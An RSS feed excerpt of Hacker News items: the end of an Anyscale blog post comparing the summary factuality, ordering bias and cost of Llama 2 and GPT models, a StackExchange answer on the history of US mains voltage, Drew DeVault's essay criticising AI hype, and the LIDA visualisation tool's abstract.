</span></code></pre></div><p>In each case we took a simple prompt that was used in <a href="https://arxiv.org/pdf/2303.15621.pdf" target="_blank" rel="noopener"><u>past studies</u></a> and we sent it for each example:&nbsp;</p><div><pre><code><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span></code><span><span>Decide</span><span> </span><span>which</span><span> </span><span>of</span><span> </span><span>the</span><span> </span><span>following</span><span> </span><span>summary</span><span> </span><span>is</span><span> </span><span>more</span><span> </span><span>consistent</span><span> </span><span>with</span><span> </span><span>the</span><span> </span><span>article</span><span> </span><span>sentence</span><span>.
</span></span><span><span></span><span>Note</span><span> </span><span>that</span><span> </span><span>consistency</span><span> </span><span>means</span><span> </span><span>all</span><span> </span><span>information</span><span> </span><span>in</span><span> </span><span>the</span><span> </span><span>summary</span><span> </span><span>is</span><span> </span><span>supported</span><span> </span><span>by</span><span> </span><span>the</span><span> </span><span>article</span><span>.&nbsp;
</span></span><span>
</span><span><span></span><span>Article</span><span> </span><span>Sentence</span><span>: </span><span>[article]</span><span>&nbsp;
</span></span><span><span></span><span>Summary</span><span> </span><span>A</span><span>: </span><span>[correct summary]</span><span>&nbsp;
</span></span><span><span></span><span>Summary</span><span> </span><span>B</span><span>: </span><span>[incorrect summary]</span><span>
</span></span><span><span></span><span>Answer</span><span> (A or B):
</span></span><span>
</span></code></pre></div><p>In a few minutes, our experiment is complete. Our experiments took between 5 minutes and 20 minutes depending on the load on the servers. </p><div><p><img src="https://images.ctfassets.net/xjan103pcp94/3g5QY9OjRRb13OneHtqwUg/79113a26ebe3d2566724d98c362b4b94/experiment_results_llama-2_ChatGPT.png" alt="Experiment results Llama 2 and ChatGPT"></p></div><p>Now let’s have a look at our data.</p><div><pre><code><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code><span><span>for</span><span> i </span><span>in</span><span> </span><span>range</span><span>(</span><span>len</span><span>(models_to_test)):
</span></span><span>&nbsp;&nbsp;&nbsp;&nbsp;df[model_short_names[models_to_test[i]]] = results[i]
</span><span>
</span><span><span>df[[</span><span>'article_sent'</span><span>, </span><span>'correct_sent'</span><span>, </span><span>'incorrect_sent'</span><span>, </span><span>'gpt35'</span><span>, </span><span>'gpt4'</span><span>,
</span></span><span><span> </span><span>'llama7'</span><span>, </span><span>'llama13'</span><span>, </span><span>'llama70'</span><span>]]</span></span></code></pre></div><div><p><img src="https://images.ctfassets.net/xjan103pcp94/qudwm84D7Zc65Vi2FPorT/dda52e3b6fa235e1715ec984d817ad77/data_results_-_llama-2_and_ChatGPT.png" alt="data results - llama-2 and ChatGPT"></p></div><p>Immediately we see a problem. While <code>gpt-3.5</code>, <code>gpt-4</code> and <code>Llama-2-70b</code> followed instructions, Llama 2 7b and 13b did not. We did try variants of the prompt to get Llama 2 7b/13b to improve instruction compliance, but none of our efforts panned out. </p><h2>Two Practical Problems on the way</h2><p>As with any research activity, it’s the surprises along the way that are sometimes the most interesting. We share these to help others also avoid the issues and not sweep them under the rug. </p><h3>Following instructions</h3><p>We discovered that LLMs do not always follow instructions. The LLMs were given very specific instructions to produce only an A or a B. This was not adhered to as a general rule. <code>Llama-2-70b</code> and <code>gpt-4</code> were the best at this, with <code>gpt-3.5</code> being close enough that you could get away with writing a few regular expressions (‘Answer: A’, ‘Option: A’, ‘A’, ‘Answer (A)’, ‘The answer is A’). We tried tweaking the prompt numerous ways but it did not change the results significantly. </p><p>This could be remedied in a few ways: </p><ul><li><p>Using fine-tuned variants of Llama 2 for instruction following vs chat. Meta did not make such models available and we wanted to stick to the official releases.</p></li><li><p>Using OpenAI’s function templates. This would be an alternative approach.</p></li><li><p>Tweaking the prompts. We spent a lot of time messing around with this but it didn’t seem to make a material difference for <code>Llama-2-7b</code> and <code>Llama-2-13b</code>.&nbsp;</p></li></ul><p>In the end we chose to craft a simple prompt and use Llama-2-70b with a simple prompt.&nbsp;</p><div><pre><code><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code><span><span>Determine</span><span> </span><span>if</span><span> </span><span>the</span><span> </span><span>following</span><span> </span><span>text</span><span> </span><span>says</span><span> </span><span>whether</span><span> </span><span>the</span><span> </span><span>answer</span><span> </span><span>is</span><span> </span><span>A</span><span>, </span><span>B</span><span> </span><span>or</span><span> </span><span>other</span><span>.&nbsp;
</span></span><span>
</span><span><span></span><span>Only</span><span> </span><span>output</span><span> </span><span>a</span><span> </span><span>single</span><span> </span><span>word</span><span>, </span><span>either</span><span>: </span><span>A</span><span> </span><span>B</span><span> </span><span>or</span><span> </span><span>other</span><span>
</span></span><span>
</span><span><span></span><span>Text</span><span>: {</span><span>query</span><span>}
</span></span><span>
</span></code></pre></div><p>This seemed to work well. We eyeballed the first 100 instances and didn’t find a single error.&nbsp;</p><h3>Ordering bias</h3><p>On the first run of these numbers, <code>gpt-3.5</code> seemed to show <i>amazing </i>results – it got 360 of the 373 correct (96%). If it’s too good to be true, it probably is. Given that humans perform at 84% accuracy, that seemed unlikely.&nbsp;</p><p>For this run, we had made it so that the correct answer was always the first (option A).&nbsp;</p><p>Diving in, we discovered that <code>gpt-3.5</code> had an <i>ordering bias</i> – it strongly preferred the first option presented to it. We reversed the ordering so the <i>second </i>answer was the correct one. Then it suddenly goes from returning the correct answer 360 times to 206. This is therefore a huge bias.&nbsp;</p><p>We still want to continue with our experiments. What should we do? We run the vote both ways, once with A being the correct answer, and one with B being the correct answer. We only consider an answer correct if it gives the correct answer both times (A the first time, B the second time).&nbsp;</p><p>What’s more, this allows us to compute bias in an interesting way. Consider if when we swap the input ordering it <i>still </i>votes A on both or B on both. Similarly if it said BB on both, that would indicate a bias towards B. </p><p>We can then simply define ordering bias as</p><div><p><img src="https://images.ctfassets.net/xjan103pcp94/2AYi6McoXny8GOHjzIsHJx/ab751a55cd1b968fcf828f38adfb7c86/orderbias_equation.png" alt="orderbias equatio"></p></div><p>Generally we found one of the two was much greater than the other. You can see our results below:</p><div><pre><code><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code><span><span>gpt35</span><span>: &nbsp; 	Accuracy: </span><span>67</span><span>.</span><span>0</span><span>%	  AA: </span><span>27</span><span>.</span><span>9</span><span>%	  BB: </span><span>0</span><span>.</span><span>8</span><span>%	  Bias: </span><span>27</span><span>.</span><span>1</span><span>% towards A
</span></span><span><span></span><span>gpt4</span><span>: &nbsp;     Accuracy: </span><span>85</span><span>.</span><span>5</span><span>%	  AA: </span><span>0</span><span>.</span><span>8</span><span>%	  BB: </span><span>7</span><span>.</span><span>5</span><span>%	  Bias: </span><span>6</span><span>.</span><span>7</span><span>% towards B
</span></span><span><span></span><span>llama7</span><span>: &nbsp; 	Accuracy: </span><span>5</span><span>.</span><span>9</span><span>%	  AA: </span><span>0</span><span>.</span><span>3</span><span>%	  BB: </span><span>87</span><span>.</span><span>9</span><span>%	  Bias: </span><span>87</span><span>.</span><span>7</span><span>% towards B
</span></span><span><span></span><span>llama13</span><span>: &nbsp; 	Accuracy: </span><span>58</span><span>.</span><span>7</span><span>%	  AA: </span><span>13</span><span>.</span><span>7</span><span>%	  BB: </span><span>14</span><span>.</span><span>7</span><span>%	  Bias: </span><span>1</span><span>.</span><span>1</span><span>% towards B
</span></span><span><span></span><span>llama70</span><span>: &nbsp; 	Accuracy: </span><span>81</span><span>.</span><span>8</span><span>%	  AA: </span><span>9</span><span>.</span><span>1</span><span>%	  BB: </span><span>4</span><span>.</span><span>0</span><span>%	  Bias: </span><span>5</span><span>.</span><span>1</span><span>% towards A
</span></span><span>
</span></code></pre></div><p>We can see that Llama 2 has a catastrophic bias towards B (87%), and that the 27% bias towards A in <code>gpt-3.5-turbo</code> is the reason it is not competitive. </p><p><i>Before we share the full results, it's worth mentioning that we have some great sessions on generative AI, LLMs, and more next month at </i><a href="https://raysummit.anyscale.com/?utm_source=anyscale&amp;utm_medium=website&amp;utm_campaign=ray_summit_2023&amp;utm_content=blog_trust_llama_2" target="_blank" rel="noopener"><i>Ray Summit 2023</i></a><i>. There's even a hands-on training covering </i><a href="https://raysummit.anyscale.com/trainings/practical-data-and-evaluation-considerations-for-building-production-ready-llm-applications-with?utm_source=anyscale&amp;utm_medium=website&amp;utm_campaign=ray_summit_2023&amp;utm_content=blog_trust_llama_2" target="_blank" rel="noopener"><i>how to build production apps with LLamaIndex and Ray</i></a><i>. </i><a href="https://www.myeventi.events/raysummit23/attendee/?utm_source=anyscale&amp;utm_medium=website&amp;utm_campaign=ray_summit_2023&amp;utm_content=blog_trust_llama_2" target="_blank" rel="noopener"><i>Register now</i></a><i>.</i></p><div><p><img src="https://images.ctfassets.net/xjan103pcp94/2bhoKVPV21JBkqxyaI4U3b/f5142e095ff2df937d858eb8572aaa5f/Ray_Summit_2023_Graphic.jpg" alt="Ray Summit 2023 Composite Image"></p></div><h2>Results</h2><div><p><img src="https://images.ctfassets.net/xjan103pcp94/3VK4xOZSztOhSTOSuIgLDI/dc9135a2f0440e8ad53656fa9088fff4/Screenshot_2023-08-23_at_9.19.09_AM.png" alt="factuality 373 examples"></p></div><h3>Near human performance</h3><p><code>Llama-2-70b</code> and <code>gpt-4</code> are both at or near human factuality levels. On this task <code>gpt-4</code> and <code>Llama-2-70b</code> are almost on par.<b> </b>This shows that the gap in quality between open source and closed LLMs is now smaller than ever. <code>Llama-2-70b</code> handily outpaces <code>gpt-3.5-turbo</code>.</p><p>So the answer to the question: can you trust Llama 2 to be factual, at least based on this experiment? Yes. It’s close to human performance. </p><h3>Ordering bias</h3><p><code>Llama-2-7b</code> and <code>gpt-3.5-turbo</code> and to some extent <code>Llama-2-13b</code> had severe <i>ordering bias </i>issues. The larger models did not seem to have this. This means they are probably <i>not </i>suitable for summaries where factuality at or near human level is required.&nbsp;</p><p>For future work, we will investigate mechanisms to reduce ordering bias through careful crafting of prompts. </p><h3><br>Cost</h3><p>We can use the data in this experiment to also estimate the cost of summarization generally. We used current <a href="https://openai.com/pricing" target="_blank" rel="noopener"><u>OpenAI pricing</u></a> as of Aug 22, 2023 and current <a href="https://docs.endpoints.anyscale.com/pricing" target="_blank" rel="noopener"><u>Anyscale Endpoints pricing</u></a> as of Aug 22, 2023 to build the table below. If we assume we can prompt the LLMs to produce summaries of equal length (which should be possible) and we target a summarization factor of 0.2 (1 word of summary for each word of input), we get the following table:&nbsp;</p><div><p><img src="https://images.ctfassets.net/xjan103pcp94/3E3aI1K6fiOD7pbIqLgpGJ/2de2b0edacbb420bcda189247872343e/image__6_.png" alt="Model Summary 1"></p></div><p>Note that:&nbsp;</p><ul><li><p><code>gpt-4</code> and <code>gpt-3.5-turbo</code> use the same tokenization and the Llama models also use the same tokenization. This is why the input tokens are the same.&nbsp;</p></li><li><p>However, Llama’s tokenization is not as efficient and uses roughly 19% more tokens for the same English passage.&nbsp;</p></li><li><p>We use price per million tokens as our standard unit. This required multiplying the prices on OpenAI’s page by 1000. This makes no difference to the final output.&nbsp;</p></li></ul><p>Based on these results, the cost for summarization with <code>gpt-4</code> is still 30 times more than the cost of <code>Llama-2-70b</code>, even though both are about the same level of factuality. The numbers do not significantly change for a summary ratio anywhere in the 0.1(28x) to 0.3 (31x)&nbsp; range since the dominant factor is clearly the input token price.</p><p>We also wanted to estimate how much this experiment cost. While this is not necessarily indicative of real world performance on summarization tasks, we felt it revealed some interesting patterns and nuances in the cost of different models.&nbsp;</p><div><p><img src="https://images.ctfassets.net/xjan103pcp94/5oI9IViJrZ0hecpPAlWrLp/90b94423083e053048c9eb1423052cb4/image__7_.png" alt="Model Summary 2"></p></div><p>A few notes before we get to observations:&nbsp;</p><ul><li><p>The output tokens are vastly different. This is not a mistake. <code>gpt-4</code>’s output would typically be a single character like ‘A’. <code>Llama-2-70b</code>’s was far more verbose, e.g. ‘The correct answer is A: those who receive centrelink payments made up half of radio rental's income last year. Explanation: Summary A accurately summarizes the article sentence by mentioning that those who receive centrelink payments made up half of radio rental's income last year. It maintains the same meaning and information as the original sentence. On the other hand, Summary B is inconsistent with the article sentence. It suggests that the ABC's report only mentioned that those who receive centrelink payments made up radio rental's income last year, which is not entirely accurate. The article sentence explicitly states that the ABC reported that those who receive centrelink payments made up half of radio rental's income last year. Therefore, Summary A is the better choice’.</p></li><li><p>&nbsp;<code>Llama-2-70b</code> is still the most concise of the Llama 2 models.&nbsp;</p></li></ul><p>Now, moving on to observations:&nbsp;</p><ul><li><p><code>gpt-4</code> cost 18x times as much as <code>Llama-2-70b</code> even though on this task they have similar performance.&nbsp;</p></li><li><p>Surprisingly, the combination of these two factors means that <code>Llama-2-70b</code>’s cost is about 10 per cent higher than gpt-3.5’s. Nonetheless, the difference in performance may mean this extra 10% is worth it.&nbsp;</p></li></ul><h2>The “how”</h2><p>You can see the code for the eval <a href="https://github.com/anyscale/factuality-eval" target="_blank" rel="noopener"><u>here</u></a>. As you can see it’s not very complicated. In particular we found that: </p><ul><li><p>Using Ray allows us to massively accelerate speed of evaluations. Without Ray, the evaluations would have taken hours, with Ray, it came down to minutes. When you think about live, production AI applications, that can translate to enormous cloud cost savings.</p></li><li><p>Pandas, though traditionally designed for numerical data, is also <i>very </i>useful for processing text. The ability to quickly and easily add columns and apply map functions to columns is powerful. Combining the power of Ray to do lots of computation with the ability of Pandas to pull that data together and simplify analysis is a very powerful combination.</p></li><li><p>We used <a href="https://app.endpoints.anyscale.com/" target="_blank" rel="noopener"><u>Anyscale Endpoints</u></a> for the llama models, and OpenAI for the <code>gpt-3.5</code>/<code>gpt-4</code> models. The exact same code could be used for both cases because Anyscale Endpoints has an OpenAI compatible API. Anyscale Endpoints proved to be very stable and the higher rate limit made processing much faster. This is another example of where efficient infrastructure can deliver significant cloud cost savings.</p></li></ul><h2>Final Conclusions</h2><div><p>In this document we showed a comparison of Open Source and Private LLMs for their factuality. <code>Llama-2-70b</code> handily beat <code>gpt-3.5-turbo</code>, and was approaching human/<code>gpt-4</code> levels of performance. This means <code>Llama-2-70b</code> is well and truly viable as an alternative to closed LLMs like those of OpenAI. We now know there’s a high probability that if we use either <code>Llama-2-70b</code> or <code>gpt-4</code>, there is a good chance it will be on par with humans for factuality.</p><p>A second lesson is to spend time with your data to discover issues like the ordering bias we saw in <code>gpt-3.5</code>. If “it’s too good to be true it probably is” applies equally well for LLMs.Llama 2 is about as factually accurate as GPT-4 for summaries and is 30X cheaper</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why does the USA use 110V and UK use 230-240V? (2014) (137 pts)]]></title>
            <link>https://electronics.stackexchange.com/questions/115200/why-does-the-usa-use-110v-and-uk-use-230-240v</link>
            <guid>37305338</guid>
            <pubDate>Tue, 29 Aug 2023 09:48:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://electronics.stackexchange.com/questions/115200/why-does-the-usa-use-110v-and-uk-use-230-240v">https://electronics.stackexchange.com/questions/115200/why-does-the-usa-use-110v-and-uk-use-230-240v</a>, See on <a href="https://news.ycombinator.com/item?id=37305338">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="text">
<p>The 110V issue is simply that once Tesla and Westinghouse proved long distance AC transmission feasible, the #1 issue driving the proliferation of electrification was lighting in houses, replacing the gas and oil lighting that was a major fire hazard of the day. Edison's lamps were 100V, but a lamp does not care if it gets AC or DC. So our AC distribution system, AT THE RESIDENTIAL LEVEL, was designed to take advantage of the existing installed base and inventory availability of Edison's lamps. Then as personal appliances began proliferating, they were designed to take advantage of the 110VAC lighting circuits already used in houses and the concept cemented itself into our culture to where there was no going back.</p>

<p>The 50/60Hz issue is different and is not "metric" at all (what's metric about the number 50?). Despite Westinghouse/Tesla having championed it, AC only really took off here once Edison gave in to the inevitability. Edison, despite having investing in AEG as Europe began electrifying, was reluctant to allow a system in which Europeans could enter our market by selling electrical products here. So after also experimenting with different frequencies (40Hz was the first major industrial installation, at the Folsom Power House in California), Edison and Steinmetz settled on 60Hz, partly because of the flicker issue, then also because it would make European equipment incompatible. He wanted it all to himself... which is the same motivation behind his initial push to discredit AC distribution in the first place. He wanted DC because he owned the US patent rights to his DC dynamo (even though he actually bought his first one, for proof of concept, from Werner von Siemens. Yes, THAT Siemens... Siemens had not patented it in the US). So if DC had won, we would have had Edison DC dynamos every 5 miles or so. Only the rich would be able to afford it, and they would all be paying Edison for the privilege. Tesla's egalitarianism ruined his vision.</p>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AI Crap – Drew Devault (238 pts)]]></title>
            <link>https://drewdevault.com/2023/08/29/2023-08-29-AI-crap.html</link>
            <guid>37305260</guid>
            <pubDate>Tue, 29 Aug 2023 09:33:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://drewdevault.com/2023/08/29/2023-08-29-AI-crap.html">https://drewdevault.com/2023/08/29/2023-08-29-AI-crap.html</a>, See on <a href="https://news.ycombinator.com/item?id=37305260">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  <article>
    <p>There is a machine learning bubble, but the technology is here to stay. Once the
bubble pops, the world <em>will</em> be changed by machine learning. But it will
probably be crappier, not better.</p>
<p>Contrary to the AI doomer’s expectations, the world isn’t going to go down in
flames any faster thanks to AI. Contemporary advances in machine learning aren’t
really getting us any closer to AGI, and as Randall Monroe pointed out back in
2018:</p>
<p><img src="https://imgs.xkcd.com/comics/robot_future_2x.png" alt="A panel from the webcomic “xkcd” showing a timeline from now into the distantfuture, dividing the timeline into the periods between “AI becomes advancedenough to control unstoppable swarms of robots” and “AI becomes self-aware andrebels against human control”. The period from self-awareness to the indefinitefuture is labelled “the part lots of people seem to worry about”; Randall isinstead worried about the part between these two epochs."></p>
<p>What will happen to AI is boring old capitalism. Its staying power will come in
the form of replacing competent, expensive humans with crappy, cheap robots.
LLMs are a pretty good advance over Markov chains, and stable diffusion can
generate images which are only somewhat uncanny with sufficient manipulation of
the prompt. Mediocre programmers will use GitHub Copilot to write trivial code
and boilerplate for them (trivial code is tautologically uninteresting), and ML
will probably remain useful for writing cover letters for you. Self-driving cars
might show up Any Day Now™, which is going to be great for sci-fi
enthusiasts and technocrats, but much worse in every respect than, say,
<a href="https://www.youtube.com/watch?v=0dKrUE_O0VE">building more trains</a>.</p>
<p>The biggest lasting changes from machine learning will be more like the
following:</p>
<ul>
<li>A reduction in the labor force for skilled creative work</li>
<li>The complete elimination of humans in customer-support roles</li>
<li>More convincing spam and phishing content, more scalable scams</li>
<li>SEO hacking content farms dominating search results</li>
<li>Book farms (both eBooks and paper) flooding the market</li>
<li>AI-generated content overwhelming social media</li>
<li>Widespread propaganda and astroturfing, both in politics and advertising</li>
</ul>
<p>AI companies will continue to generate waste and CO<sub>2</sub> emissions at a
huge scale as they aggressively scrape all internet content they can find,
externalizing costs onto the world’s digital infrastructure, and feed their
hoard into GPU farms to generate their models. They might keep humans in the
loop to help with tagging content, seeking out the cheapest markets with the
weakest labor laws to build human sweatshops to feed the AI data monster.</p>
<p>You will never trust another product review. You will never speak to a human
being at your ISP again. Vapid, pithy media will fill the digital world around
you. Technology built for engagement farms – those AI-edited videos with the
grating machine voice you’ve seen on your feeds lately – will be white-labeled
and used to push products and ideologies at a massive scale with a minimum cost
from social media accounts which are populated with AI content, cultivate an
audience, and sold in bulk and in good standing with the Algorithm.</p>
<p>All of these things are already happening and will continue to get worse. The
future of media is a soulless, vapid regurgitation of all media that came before
the AI epoch, and the fate of all new creative media is to be subsumed into the
roiling pile of math.</p>
<p>This will be incredibly profitable for the AI barons, and to secure their
investment they are deploying an immense, expensive, world-wide propaganda
campaign. To the public, the present-day and potential future capabilities of
the technology are played up in breathless promises of ridiculous possibility.
In closed-room meetings, much more realistic promises are made of cutting
payroll budgets in half.</p>
<p>The propaganda also leans into the mystical sci-fi AI canon, the threat of smart
computers with world-ending power, the forbidden allure of a new Manhattan
project and all of its consequences, the long-prophesied singularity. The
technology is nowhere near this level, a fact well-known by experts and the
barons themselves, but the illusion is maintained in the interests of lobbying
lawmakers to help the barons erect a moat around their new industry.</p>
<p>Of course, AI does present a threat of violence, but as Randall points out, it’s
not from the AI itself, but rather from the people that employ it. The US
military is testing out AI-controlled drones, which aren’t going to be
self-aware but will scale up human errors (or human malice) until innocent
people are killed. AI tools are already being used to set bail and parole
conditions&nbsp;– it can put you in jail or keep you there. Police are using AI for
facial recognition and “predictive policing”. Of course, all of these models end
up discriminating against minorities, depriving them of liberty and often
getting them killed.</p>
<p>AI is defined by aggressive capitalism. The hype bubble has been engineered by
investors and capitalists dumping money into it, and the returns they expect on
that investment are going to come out of your pocket. The singularity is not
coming, but the most realistic promises of AI are going to make the world worse.
The AI revolution is here, and I don’t really like it.</p>
<details>
  <summary>Flame bait</summary>
I had much more inflammatory article drafted for this topic under the title
"ChatGPT is the new techno-atheist's substitute for God". It makes some fairly
pointed comparisons between the cryptocurrency cult and the machine learning
cult and the religious, unshakeable, and largely ignorant faith in both
technologies as the harbingers of progress. It was fun to write, but this is
probably the better article.
<p>I found this Hacker News comment and quoted it in the original draft: “It’s
probably worth talking to GPT4 before seeking professional help [to deal with
depression].”</p>
<p>In case you need to hear it: <a href="https://www.euronews.com/next/2023/03/31/man-ends-his-life-after-an-ai-chatbot-encouraged-him-to-sacrifice-himself-to-stop-climate-">do not</a> (TW: suicide) seek out OpenAI’s
services to help with your depression. Finding and setting up an appointment
with a therapist can be difficult for a lot of people – it’s okay for it to
feel hard. Talk to your friends and ask them to help you find the right care for
your needs.</p>
</details>

  </article>
</div><section>
  <h2>
    Articles from blogs I read
    <small>
      Generated by
      <a href="https://git.sr.ht/~sircmpwn/openring">openring</a>
    </small>
  </h2>
  <section>
    
    <div>
      <h4>
        <a href="https://go.dev/blog/rebuild" target="_blank" rel="noopener">Perfectly Reproducible, Verified Go Toolchains</a>
      </h4>
      <p>Go 1.21 is the first perfectly reproducible Go toolchain.</p>
      <p><small>
        via <a href="https://blog.golang.org/feed.atom">The Go Blog</a>
      </small>
      <small>August 28, 2023</small>
    </p></div>
    
    <div>
      <h4>
        <a href="https://aphyr.com/posts/365-10-operations-large-histories-with-jepsen" target="_blank" rel="noopener">10⁹ Operations: Large Histories with Jepsen</a>
      </h4>
      <p>Jepsen is a library for writing tests of concurrent systems: everything from single-node data structures to distributed databases and queues. A key part of this process is recording a history of operations performed during the test. Jepsen checkers analyz…</p>
      <p><small>
        via <a href="https://aphyr.com/">Aphyr: Posts</a>
      </small>
      <small>August 18, 2023</small>
    </p></div>
    
    <div>
      <h4>
        <a href="https://emersion.fr/blog/2023/status-update-56/" target="_blank" rel="noopener">Status update, August 2023</a>
      </h4>
      <p>Hi!
Let me start this status update with an announcement: from 2023-08-28 to
2023-10-01 (!), I will be on leave, so I will have reduced availability. Don’t
be surprised if I miss some e-mails, and feel free to ping me again (more
generally, please do ping me …</p>
      <p><small>
        via <a href="https://emersion.fr/blog/">emersion</a>
      </small>
      <small>August 18, 2023</small>
    </p></div>
    
  </section>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Automatic Generation of Visualizations and Infographics with LLMs (144 pts)]]></title>
            <link>https://microsoft.github.io/lida/</link>
            <guid>37305240</guid>
            <pubDate>Tue, 29 Aug 2023 09:30:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://microsoft.github.io/lida/">https://microsoft.github.io/lida/</a>, See on <a href="https://news.ycombinator.com/item?id=37305240">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Systems that support users in the automatic creation of visualizations must address several subtasks - understand the semantics of data, enumerate relevant visualization goals and generate visualization specifications. In this work, we</p><!-- --> <p><span>pose visualization generation as a multi-stage generation problem<!-- --> </span></p><!-- --><p>and argue that well-orchestrated pipelines based on large language models (LLMs) and image generation models (IGMs) are suitable to addressing these tasks. We present LIDA, a novel tool for generating grammar-agnostic visualizations and infographics. LIDA comprises of 4 modules - A SUMMARIZER that converts data into a rich but compact natural language summary, a GOAL EXPLORER that enumerates visualization goals given the data, a VISGENERATOR that generates, refines, executes and filters visualization code and an INFOGRAPHER module that yields data-faithful stylized graphics using IGMs. LIDA provides a python api, and a hybrid user interface (direct manipulation and</p><!-- --> <p><span>multilingual</span> natural language) for interactive chart, infographics and data story generation.</p></div></div>]]></description>
        </item>
    </channel>
</rss>